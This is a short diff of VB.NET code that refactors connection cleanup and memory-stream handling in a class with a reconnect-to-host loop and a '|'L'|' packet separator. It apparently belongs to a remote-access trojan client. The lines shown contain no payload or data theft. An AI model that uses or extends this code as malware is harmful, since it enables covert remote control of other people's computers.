@@ -6,7 +6,6 @@ Public Class Main
     Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
 
         KEY = K
-        Dim M As New IO.MemoryStream ' create memory stream
         Dim lp As Integer = 0
 
 e:      ' clear things and ReConnect
@@ -70,10 +69,22 @@ rr:
         GoTo re
 
 cc:
+        CloseMe()
+    End Sub
+
+    Public Shared Sub CloseMe()
+        Try
+            C.Client.Close()
+        Catch ex As Exception
+        End Try
         Try
             C.Close()
-            C = Nothing
-        Catch ex As Exception
+        Catch ex2 As Exception
+        End Try
+        C = Nothing
+        Try
+            M.Dispose()
+        Catch ex4 As Exception
         End Try
     End Sub
 
@@ -98,15 +109,15 @@ cc:
 
     Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
         Dim a As New Collections.Generic.List(Of Byte())
-        Dim M As New IO.MemoryStream
-        Dim MM As New IO.MemoryStream
+        Dim _M As New IO.MemoryStream
+        Dim _MM As New IO.MemoryStream
         Dim T As String() = Split(BS(b), WRD)
-        M.Write(b, 0, T(0).Length)
-        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
-        a.Add(M.ToArray)
-        a.Add(MM.ToArray)
-        M.Dispose()
-        MM.Dispose()
+        _M.Write(b, 0, T(0).Length)
+        _MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
+        a.Add(_M.ToArray)
+        a.Add(_MM.ToArray)
+        _M.Dispose()
+        _MM.Dispose()
         Return a.ToArray
     End Function
 
@@ -143,5 +154,7 @@ cc:
     Public Shared _H
     Public Shared _P
     Public Shared SPL As String = "|'L'|"
+    Public Shared M As New IO.MemoryStream
+
 
 End Class
